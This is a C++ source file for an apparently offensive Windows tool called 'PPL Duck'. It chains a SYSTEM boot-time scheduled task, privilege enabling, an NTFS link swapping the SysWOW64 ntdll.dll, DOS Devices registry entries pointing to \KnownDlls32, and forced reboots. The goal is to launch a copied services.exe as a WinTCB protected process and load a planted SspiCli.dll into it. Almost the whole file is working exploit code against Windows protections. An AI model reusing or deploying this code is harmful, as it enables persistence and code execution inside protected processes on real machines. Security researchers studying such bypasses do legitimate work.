// PPL Duck.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <comdef.h>
#include <taskschd.h>
#include <io.h>
#include <fcntl.h>
#include <conio.h>
#include "Win-Ops-Master.h"
#include <DbgHelp.h>
#include <winternl.h>

#pragma comment(lib, "DbgHelp.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

HANDLE GlobalSectionHandle = NULL;

#define InitializeObjectAttributes2( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

typedef NTSTATUS(NTAPI _NtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
    );
typedef NTSTATUS(NTAPI _NtOpenSymbolicLinkObject)(
    _Out_ PHANDLE            LinkHandle,
    _In_  ACCESS_MASK        DesiredAccess,
    _In_  POBJECT_ATTRIBUTES ObjectAttributes
);
typedef NTSTATUS(NTAPI _RtlReportSilentProcessExit)(
    _In_ HANDLE ProcessHandle,
    _In_ DWORD  ExitCode
    );

HMODULE hm = GetModuleHandle(L"ntdll.dll");
_NtCreateSection* NtCreateSection = (_NtCreateSection*)GetProcAddress(hm, "NtCreateSection");
_NtOpenSymbolicLinkObject* NtOpenSymbolicLinkObject = (_NtOpenSymbolicLinkObject*)GetProcAddress(hm, "NtOpenSymbolicLinkObject");
_RtlReportSilentProcessExit* RtlReportSilentProcessExit = (_RtlReportSilentProcessExit*)GetProcAddress(hm, "RtlReportSilentProcessExit");

OpsMaster op;
std::wstring stempdir = L"";

BOOL ScheduleTask(const wchar_t* arguments)
{
    //  this is a bit of a mess, copied from msdn, seems to work, might consider refactoring later
    //  ------------------------------------------------------
    //  Initialize COM.
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        printf("\nCoInitializeEx failed: %x", hr);
        return FALSE;
    }

    //  Set general COM security levels.
    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);

    if (FAILED(hr))
    {
        printf("\nCoInitializeSecurity failed: %x", hr);
        CoUninitialize();
        return FALSE;
    }

    //  ------------------------------------------------------
    //  Create a name for the task.
    LPCWSTR wszTaskName = L"PPLDuck";

    wchar_t mx[MAX_PATH];
    GetModuleFileName(NULL, mx, MAX_PATH);
    std::wstring wstrExecutablePath = mx;


    //  ------------------------------------------------------
    //  Create an instance of the Task Service. 
    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&pService);
    if (FAILED(hr))
    {
        printf("Failed to create an instance of ITaskService: %x", hr);
        CoUninitialize();
        return FALSE;
    }

    //  Connect to the task service.
    hr = pService->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());
    if (FAILED(hr))
    {
        printf("ITaskService::Connect failed: %x", hr);
        pService->Release();
        CoUninitialize();
        return FALSE;
    }

    //  ------------------------------------------------------
    //  Get the pointer to the root task folder.  
    //  This folder will hold the new task that is registered.
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr))
    {
        printf("Cannot get Root Folder pointer: %x", hr);
        pService->Release();
        CoUninitialize();
        return FALSE;
    }

    //  If the same task exists, remove it.
    pRootFolder->DeleteTask(_bstr_t(wszTaskName), 0);

    //  Create the task builder object to create the task.
    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);

    pService->Release();
    if (FAILED(hr))
    {
        printf("Failed to create a task definition: %x", hr);
        pRootFolder->Release();
        CoUninitialize();
        return FALSE;
    }
    ITaskSettings* pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);
    if (FAILED(hr))
    {
        printf("\nCannot get settings pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return FALSE;
    }

    //  Set setting values for the task. 
    hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
    pSettings->Release();
    if (FAILED(hr))
    {
        printf("\nCannot put setting info: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return FALSE;
    }


    //  ------------------------------------------------------
    //  Get the trigger collection to insert the boot trigger.
    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (FAILED(hr))
    {
        printf("\nCannot get trigger collection: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return FALSE;
    }

    //  Add the boot trigger to the task.
    ITrigger* pTrigger = NULL;
    hr = pTriggerCollection->Create(TASK_TRIGGER_BOOT, &pTrigger);
    pTriggerCollection->Release();
    if (FAILED(hr))
    {
        printf("\nCannot create the trigger: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return FALSE;
    }

    IBootTrigger* pBootTrigger = NULL;
    hr = pTrigger->QueryInterface(
        IID_IBootTrigger, (void**)&pBootTrigger);
    pTrigger->Release();
    if (FAILED(hr))
    {
        printf("\nQueryInterface call failed for IBootTrigger: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return FALSE;
    }

    hr = pBootTrigger->put_Id(_bstr_t(L"Trigger1"));
    if (FAILED(hr))
        printf("\nCannot put the trigger ID: %x", hr);

    //  Set the task to start at a certain time. The time 
    //  format should be YYYY-MM-DDTHH:MM:SS(+-)(timezone).
    //  For example, the start boundary below
    //  is January 1st 2005 at 12:05
    hr = pBootTrigger->put_StartBoundary(_bstr_t(L"2005-01-01T12:05:00"));
    if (FAILED(hr))
        printf("\nCannot put the start boundary: %x", hr);

    hr = pBootTrigger->put_EndBoundary(_bstr_t(L"2077-01-01T08:00:00"));
    if (FAILED(hr))
        printf("\nCannot put the end boundary: %x", hr);
    pBootTrigger->Release();
    if (FAILED(hr))
    {
        printf("\nCannot put delay for boot trigger: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return FALSE;
    }


    //  ------------------------------------------------------   
    IActionCollection* pActionCollection = NULL;

    //  Get the task action collection pointer.
    hr = pTask->get_Actions(&pActionCollection);
    if (FAILED(hr))
    {
        printf("\nCannot get Task collection pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return FALSE;
    }

    //  Create the action, specifying it as an executable action.
    IAction* pAction = NULL;
    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    pActionCollection->Release();
    if (FAILED(hr))
    {
        printf("\nCannot create the action: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return FALSE;
    }

    IExecAction* pExecAction = NULL;
    //  QI for the executable task pointer.
    hr = pAction->QueryInterface(
        IID_IExecAction, (void**)&pExecAction);
    pAction->Release();
    if (FAILED(hr))
    {
        printf("\nQueryInterface call failed for IExecAction: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return FALSE;
    }

    hr = pExecAction->put_Path(_bstr_t(wstrExecutablePath.c_str()));
    hr = pExecAction->put_Arguments(_bstr_t(arguments));
    pExecAction->Release();
    if (FAILED(hr))
    {
        printf("\nCannot set path of executable: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return FALSE;
    }


    //  ------------------------------------------------------
    //  Save the task in the root folder.
    IRegisteredTask* pRegisteredTask = NULL;
    VARIANT varPassword;
    varPassword.vt = VT_EMPTY;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(wszTaskName),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(L"SYSTEM"),
        varPassword,
        TASK_LOGON_SERVICE_ACCOUNT,
        _variant_t(L""),
        &pRegisteredTask);
    if (FAILED(hr))
    {
        printf("\nError saving the Task : %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return FALSE;
    }

    printf("[+] PPLDuck Task successfully registered.\n");

    //  Clean up.
    pRootFolder->Release();
    pTask->Release();
    pRegisteredTask->Release();
    CoUninitialize();
    return TRUE;
}
bool DeleteTask() {

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        printf("CoInitializeEx failed: 0x%x", hr);
        return false;
    }

    //  Set general COM security levels.
    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);

    if (FAILED(hr))
    {
        printf("CoInitializeSecurity failed: 0x%x", hr);
        CoUninitialize();
        return false;
    }
    LPCWSTR wszTaskName = L"PPLDuck";
    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&pService);
    if (FAILED(hr))
    {
        printf("Failed to create an instance of ITaskService: 0x%x", hr);
        CoUninitialize();
        return false;
    }
    hr = pService->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());
    if (FAILED(hr))
    {
        printf("ITaskService::Connect failed: 0x%x", hr);
        pService->Release();
        CoUninitialize();
        return false;
    }

    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr))
    {
        printf("Cannot get Root Folder pointer: 0x%x", hr);
        pService->Release();
        CoUninitialize();
        return false;
    }
    pRootFolder->DeleteTask(_bstr_t(wszTaskName), NULL);
    //ignore the results, the task may not exist
    pService->Release();
    CoUninitialize();
    return true;
}


BOOL EnableTokenPriv(HANDLE hToken, LPCTSTR priv, BOOL EnablePriv = TRUE)
{
    TOKEN_PRIVILEGES tp = { 0 };
    LUID luid;

    if (!LookupPrivilegeValue( NULL, priv, &luid))
    {
        printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = EnablePriv ? SE_PRIVILEGE_ENABLED : 0;
    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
        {
            printf("[-] The specified token doesn't have the required privilege.\n");
            return FALSE;
        }
        printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL CheckRequiredFiles() {
    std::wstring ntdll = L"";
    std::wstring sech = L"";
    std::wstring SspiCli = L"";
    DWORD attributes = NULL;
    ntdll = op.GetCurrentExeDirWithFileAppended(L"ntdll.dll"); // not sure why the hell did I wrote this function in the first place
    attributes = GetFileAttributes(ntdll.c_str());
    if (attributes == INVALID_FILE_ATTRIBUTES || attributes & FILE_ATTRIBUTE_DIRECTORY) {
        wprintf(L"[-] ntdll.dll not found, please place it in the same directory as PPL Duck.\n");
        return false;
    }
    wprintf(L" | ntdll.dll : OK.\n");
    sech = op.GetCurrentExeDirWithFileAppended(L"services.exe");
    attributes = GetFileAttributes(sech.c_str());
    if (attributes == INVALID_FILE_ATTRIBUTES || attributes & FILE_ATTRIBUTE_DIRECTORY) {
        wprintf(L"[-] services.exe not found, please place it in the same directory as PPL Duck.\n");
        return false;
    }
    wprintf(L" | services.exe : OK.\n");
    SspiCli = op.GetCurrentExeDirWithFileAppended(L"SspiCli.dll");
    attributes = GetFileAttributes(SspiCli.c_str());
    if (attributes == INVALID_FILE_ATTRIBUTES || attributes & FILE_ATTRIBUTE_DIRECTORY) {
        wprintf(L"[-] SspiCli.dll not found, please place it in the same directory as PPL Duck.\n");
        return false;
    }
    wprintf(L" | SspiCli.dll : OK.\n");
    wprintf(L"[+] Files : OK.\n");
    return true;
}

BOOL EnableRequiredTokenPrivs() {
	
    HANDLE hprocess = NULL;
    HANDLE htoken = NULL;
    BOOL res = FALSE;
    wprintf(L"[*] Enabling required privileges in current process token...\n");
    hprocess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, GetCurrentProcessId());
    if (!hprocess) {
        wprintf(L"[-] Unexpected error occured while opening current process, error : %d\n", GetLastError());
        goto cleanup1;
    }
    res = OpenProcessToken(hprocess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &htoken);
    CloseHandle(hprocess);
    hprocess = NULL;
    if (!res) {
        wprintf(L"[-] Unexpected error occured while opening current process token, error : %d\n", GetLastError());
        goto cleanup1;
    }
    if (!EnableTokenPriv(htoken, SE_BACKUP_NAME, TRUE)) {
        wprintf(L"[-] Failed to enable SeAssignPrimaryTokenPrivilege, error : %d\n", GetLastError());
        goto cleanup1;
    }
    wprintf(L" | SeBackupPrivilege : OK.\n");
    if (!EnableTokenPriv(htoken, SE_SHUTDOWN_NAME, TRUE)) {
        wprintf(L"[-] Failed to enable SeAssignPrimaryTokenPrivilege, error : %d\n", GetLastError());
        goto cleanup1;
    }
    wprintf(L" | SeShutdownPrivilege : OK.\n");
    if (!EnableTokenPriv(htoken, SE_RESTORE_NAME, TRUE)) {
        wprintf(L"[-] Failed to enable SeAssignPrimaryTokenPrivilege, error : %d\n", GetLastError());
        goto cleanup1;
    }
    wprintf(L" | SeRestorePrivilege : OK.\n");
    if (!EnableTokenPriv(htoken, SE_CREATE_SYMBOLIC_LINK_NAME, TRUE)) {
        wprintf(L"[-] Failed to enable SeAssignPrimaryTokenPrivilege, error : %d\n", GetLastError());
        goto cleanup1;
    }
    wprintf(L" | SeCreateSymbolicLinkPrivilege : OK.\n");
    wprintf(L"[+] All required privileges : OK.\n");
    CloseHandle(htoken);
    return TRUE;
cleanup1:
    if (htoken) {
        CloseHandle(htoken);
    }
    if (hprocess)
    {
        CloseHandle(hprocess);
    }
    return FALSE;
}

BOOL DowngradeWow64_ntdll() {

    // just not to forget about the variables in the futures
    // wow64dir is the ADS which is user to create the symlink from syswow64 to windir
    // wow64dir2 is used for printing purpose
    // windir is the directory where our dlls will be
    // I'm not the best when it comes to naming variables
    BOOL res = FALSE;
    DWORD windirsz = 0;
    HANDLE hsymlink = NULL;
    BOOL linkcreated = FALSE;

    
    // get the wow64 dir
    DWORD wow64dirsz = GetSystemWow64Directory(NULL, NULL);
	wchar_t* wow64dir = new wchar_t[wow64dirsz + 15];
    wmemset(wow64dir, 0, wow64dirsz + 15);
    GetSystemWow64Directory(wow64dir, wow64dirsz);
    wow64dir[wow64dirsz - 1] = L'\\';
    wcscat(wow64dir, L"ntdll.dll:sus");
    wchar_t windir[] = L"\\??\\C:\\Windows\\ntdll.dll";
    wprintf(L"[*] Linking %s to %s\n",wow64dir,windir);
    hsymlink = op.OpenFileNative(wow64dir, FILE_WRITE_ATTRIBUTES, ALL_SHARING, CREATE_ALWAYS, 0x00000040 | 0x00004000 | FILE_FLAG_OPEN_REPARSE_POINT);
    if (!hsymlink)
    {
        wprintf(L"[-] Error opening %s to set symlink : %d\n", wow64dir, op.GetLastErr());
        goto cleanup2;
    }
    if (!op.CreateNTFSLink(hsymlink, windir,windir)) {
        wprintf(L"[-] Unable to create link from %s to %s : %d",wow64dir,windir,op.GetLastErr());
        goto cleanup2;
    }
    wprintf(L"[+] Link created %s => %s", wow64dir, windir);
    delete []wow64dir;
    return TRUE;

cleanup2:
    if (hsymlink) {
        CloseHandle(hsymlink);
        DeleteFile(wow64dir);
    }
    delete[] wow64dir;
    return res;
}

BOOL ModifyRegistry() {
    HKEY hsessionmgr = NULL;
    LSTATUS stat = NULL;
    stat = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\DOS Devices", NULL, KEY_SET_VALUE, &hsessionmgr);
    if (stat)
    {
        wprintf(L"Unable to open \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\DOS Devices\" : %d", stat);
        return FALSE;
    }
    wchar_t dosdv1[] = L"\\KnownDlls32";
    wchar_t dosdv2[] = L"\\SspiCli.dll";
    if(RegSetValueEx(hsessionmgr,L"AA",NULL,REG_SZ,(LPBYTE)dosdv1, sizeof(dosdv1)) || RegSetValueEx(hsessionmgr,L"AA\\SspiCli.dll",NULL,REG_SZ,(LPBYTE)dosdv2, sizeof(dosdv2)))
	{
        RegCloseKey(hsessionmgr);
		wprintf(L"Unable to set \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\DOS Devices\" : %d", stat);
		return FALSE;
	}
    wprintf(L" | Add \\GLOBAL??\\AA => \\KnownDlls32 : OK.\n");
    wprintf(L" | Add \\GLOBAL??\\AA\\SspiCli.dll => \\SspiCli.dll : OK.\n");
    RegCloseKey(hsessionmgr);
    return TRUE;
}

BOOL CopyDllAndReboot() {
    if (!EnableRequiredTokenPrivs())
        return FALSE;
    if (!ModifyRegistry())
        return FALSE;
    DWORD wow64dirsz = GetSystemWow64Directory(NULL, NULL);
    wchar_t* wow64dir = new wchar_t[wow64dirsz + 11];
    wmemset(wow64dir, 0, wow64dirsz + 15);
    GetSystemWow64Directory(wow64dir, wow64dirsz);
    wow64dir[wow64dirsz - 1] = L'\\';
    wcscat(wow64dir, L"ntdll.dll");
	HANDLE hntdll = op.OpenFileNative(wow64dir, DELETE, ALL_SHARING, OPEN_EXISTING, 0x00000040 | 0x00004000 | FILE_FLAG_OPEN_REPARSE_POINT | 0x00001000);
    if (!hntdll)
    {
		wprintf(L"[-] Error opening %s to remove symlink : %d\n", wow64dir, op.GetLastErr());
        return FALSE;
    }
    CloseHandle(hntdll);
    wprintf(L"[+] Symbolic link %s deleted.\n",wow64dir);
    std::wstring ntdll = op.GetCurrentExeDirWithFileAppended(L"ntdll.dll");
    if (!CopyFile(ntdll.c_str(), wow64dir, FALSE)) {
		wprintf(L"[-] Unable to copy %s to %s : %d\n", ntdll.c_str(), wow64dir, GetLastError());
        return FALSE;
    }
	wprintf(L"[+] ntdll.dll copied to %s\n", wow64dir);
    delete[] wow64dir;
    ScheduleTask(L"stage2");
    if (!InitiateSystemShutdownW(NULL, NULL, NULL, TRUE, TRUE)) {
		wprintf(L"[-] Unable to initiate system shutdown : %d\n", GetLastError());
		return FALSE;
    }
    return TRUE;
}

BOOL LaunchAsPPL() {
    if (!EnableRequiredTokenPrivs())
        return FALSE;
    std::wstring cmdline;
    DWORD ProtectionLevel = PROTECTION_LEVEL_WINTCB_LIGHT;
    SIZE_T AttributeListSize;
    STARTUPINFOEXW StartupInfoEx = { 0 };

    StartupInfoEx.StartupInfo.cb = sizeof(StartupInfoEx);
    PROCESS_INFORMATION ProcessInformation = { 0 };

    wchar_t pipename[128] = { 0 };
    GUID uid;
    wchar_t guid[64] = { 0 };
    HANDLE hpipe = NULL;
    char ptr1[64];
    char ptr2[64];
    char data[128];
    DWORD nb = 0;
    int i = 0;
    HANDLE hnewprocess = NULL;
    HANDLE hnewthread = NULL;

    DWORD res1 = 0;
    std::wstring SspiCli = op.GetCurrentExeDirWithFileAppended(L"SspiCli.dll");
    HANDLE hSspiCli = op.OpenFileNative(SspiCli, GENERIC_ALL, FILE_SHARE_READ, OPEN_EXISTING, 0x00000040 | 0x00004000);
    HANDLE hwait_event = CreateEvent(NULL, FALSE, FALSE, L"Global\\SSpiCliLoaded");
    if (!hwait_event)
    {
        wprintf(L"Unable to create a wait event : %d\n",GetLastError());
        return FALSE;
    }
    if (!hSspiCli)
    {
        wprintf(L"Failed to open \"%s\" error : %d\n", SspiCli.c_str(), op.GetLastErr());
        return FALSE;
    }

	OBJECT_ATTRIBUTES objattr = { 0 };
	UNICODE_STRING uni_SspiCli = { 0 };
	RtlInitUnicodeString(&uni_SspiCli, L"\\SspiCli.dll");
    InitializeObjectAttributes2(&objattr, &uni_SspiCli, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    NTSTATUS stat = NtCreateSection(&GlobalSectionHandle, SECTION_ALL_ACCESS, &objattr, NULL, PAGE_EXECUTE_WRITECOPY, SEC_IMAGE, hSspiCli);
    CloseHandle(hSspiCli);
    if (stat)
    {
        wprintf(L"Failed to create \\SspiCli.dll status : 0x%0.8X\n", stat);
        return FALSE;
    }
	wprintf(L"[+] NtCreateSection : OK\n");
	wprintf(L"[+] Section created in \\SspiCli.dll\n");
	
    wprintf(L"[*] Attempting to run services.exe as PROTECTION_LEVEL_WINTCB_LIGHT\n");

	
    InitializeProcThreadAttributeList(NULL, 1, 0, &AttributeListSize);

    StartupInfoEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY|HEAP_GENERATE_EXCEPTIONS, AttributeListSize);

    if (InitializeProcThreadAttributeList(StartupInfoEx.lpAttributeList,
        1,
        0,
        &AttributeListSize) == FALSE)
    {
        wprintf(L"[-] Unable to initialize proc thread attribute list : %d\n", GetLastError());
        goto cleanup3;
    }


    if (!UpdateProcThreadAttribute(StartupInfoEx.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
        &ProtectionLevel,
        sizeof(ProtectionLevel),
        NULL,
        NULL))
    {
        wprintf(L"[-] Unable to update proc thread attribute list : %d\n", GetLastError());
		goto cleanup3;
    }


    // create ppl process
    cmdline = std::wstring(L"\"" + op.GetCurrentExeDirWithFileAppended(L"services.exe") + L"\" " + std::to_wstring(GetCurrentProcessId()) + std::wstring(L" ") + pipename);
    if (!CreateProcessW(op.GetCurrentExeDirWithFileAppended(L"services.exe").c_str(),
        (LPWSTR)cmdline.c_str(),
        NULL,
        NULL,
        NULL,
        CREATE_PROTECTED_PROCESS | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        (LPSTARTUPINFO)&StartupInfoEx,
        &ProcessInformation))
    {
        wprintf(L"[-] Unable to create services.exe as PPL WinTCB : %d\n", GetLastError());
        goto cleanup3;
    }
    wprintf(L"[+] PPL WinTCB process has been created with commandline : %s\n", cmdline.c_str());
    // the problem with services.exe is the fact that if you execute it as SYSTEM, it won't exit as soon as it realize that it isn't the real services.exe
    // 
    // we will give it a delay, if it doesn't exit, we will kill it
    
    res1 = WaitForSingleObject(hwait_event, 10000 /*10s*/);
    CloseHandle(hwait_event);
    if (res1 == WAIT_TIMEOUT)
    {
		wprintf(L"[-] Wait for SspiCli.dll load timed out.\n");
        TerminateProcess(ProcessInformation.hProcess,ERROR_SUCCESS);
        goto cleanup3;
    }
    wprintf(L"[+] DLL Loaded :)\n");
    return true;
cleanup3:
    if (GlobalSectionHandle)
        CloseHandle(GlobalSectionHandle);
	if(ProcessInformation.hProcess)
		CloseHandle(ProcessInformation.hProcess);
    if(ProcessInformation.hThread)
		CloseHandle(ProcessInformation.hThread);
	if(StartupInfoEx.lpAttributeList)
		HeapFree(GetProcessHeap(), 0, StartupInfoEx.lpAttributeList);
    if (hpipe && hpipe != INVALID_HANDLE_VALUE)
        CloseHandle(hpipe);
    return TRUE;
}

BOOL DoCleanup() {

    if (GetFileAttributes(op.GetCurrentExeDirWithFileAppended(L"no-cleanup").c_str()) != INVALID_FILE_ATTRIBUTES)
    {
        return TRUE;
    }
    LSTATUS stat = NULL;
    HKEY hdosdv = NULL;
    wprintf(L"[*] Registry Cleanup...\n");
    stat = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\DOS Devices", NULL, KEY_SET_VALUE, &hdosdv);
    if (stat)
    {
        wprintf(L"[-] Unable to open HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\DOS Devices : %d\n[*] Skipping DOS Devices Cleanup.\n", stat);
    }
    else {
        RegDeleteValue(hdosdv, L"AA");
        RegDeleteValue(hdosdv, L"AA\\SspiCli.dll");
        wprintf(L" | Removed HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\DOS Devices\\AA\n");
        wprintf(L" | Removed HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\DOS Devices\\AA\\SspiCli.dll\n");
        // Ignore the results, since they may not exist
        RegCloseKey(hdosdv);
    }
    if (GlobalSectionHandle) {
        CloseHandle(GlobalSectionHandle);
        GlobalSectionHandle = NULL;
    }
    // remove the link from \\KnownDll32 requires running as PPL
    // so we will handle that from SspiCli.dll
    // it's necessary to not that we're still required to remove \\GLOBAL??\\AA
    HANDLE hlnk = NULL;
    OBJECT_ATTRIBUTES objattr = { 0 };
    UNICODE_STRING lnkname = { 0 };
    RtlInitUnicodeString(&lnkname, L"\\GLOBAL??\\AA");
    InitializeObjectAttributes2(&objattr, &lnkname, OBJ_CASE_INSENSITIVE, NULL, NULL);
    NTSTATUS res = NtOpenSymbolicLinkObject(&hlnk, DELETE, &objattr);
    if (res)
    {
        wprintf(L"[-] Unable to open \\GLOBAL??\\AA : 0x%0.8X\n", res);
    }
    else {
        if (!op.MakeTemporaryObj(hlnk))
        {
            wprintf(L"[-] Unable to open \\GLOBAL??\\AA : %d\n", op.GetLastErr());
        }
        else {
            wprintf(L" | ZwMakeTemporaryObject : OK.\n");
        }
        CloseHandle(hlnk);
    }

    wprintf(L"[+] Cleanup : OK.\n");
    return FALSE;
}


int main()
{
    
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLine(), &argc);

	// enable logging
    std::wstring logfile = op.GetCurrentExeDirWithFileAppended(L"PPLDuck.log");
    HANDLE hlog = CreateFile(logfile.c_str(), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    SYSTEMTIME st = { 0 };
    int fd = 0;
    if (hlog == INVALID_HANDLE_VALUE)
    {
		wprintf(L"[*] Opening log file failed with error %d\n", GetLastError());
        goto skip_logging;
    }
    SetStdHandle(STD_OUTPUT_HANDLE, hlog);
    fd = _open_osfhandle((intptr_t)hlog, _O_TEXT| _O_APPEND);
    GetSystemTime(&st);
    _dup2(fd, 1);
	wprintf(L"\n[%02d/%02d/%04d] %02d:%02d:%02d - PPL Duck%s started.\n", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond,
        argc > 1 ? ((_wcsicmp(argv[1], L"stage1") == 0 ? L" stage 1" : (_wcsicmp(argv[1], L"stage2") == 0 ? L" stage 2" : L""))) : L"");
skip_logging:
    if (argc >= 2)
    {
        if (_wcsicmp(argv[1], L"stage1") == 0)
        {
            DeleteTask();
            CopyDllAndReboot();
            goto cleanup;
        }
        if (_wcsicmp(argv[1], L"stage2") == 0)
        {
            DeleteTask();
            LaunchAsPPL();
            //DoCleanup();
            return 0;
        }
    }
    wprintf(L"[*] Checking required files...\n");
    // check if ntdll and services.exe bins are present
    if (!CheckRequiredFiles())
        goto cleanup;
    // enable SeImpersonatePrivilege in current token, then enable SeBackupPrivilege and SeRestorePrivilege in system token
    if (!EnableRequiredTokenPrivs())
        goto cleanup;
    if (!ScheduleTask(L"stage1"))
        goto cleanup;
    if (!DowngradeWow64_ntdll()) {
        DeleteTask();
        goto cleanup;
    }
    else {
        if (!InitiateSystemShutdownW(NULL, NULL, NULL, TRUE, TRUE)) {
            wprintf(L"[-] Unable to initiate system shutdown : %d\n", GetLastError());
            goto cleanup;
        }
    }
cleanup:
	if(hlog != INVALID_HANDLE_VALUE)
        CloseHandle(hlog);
	return 0;
}

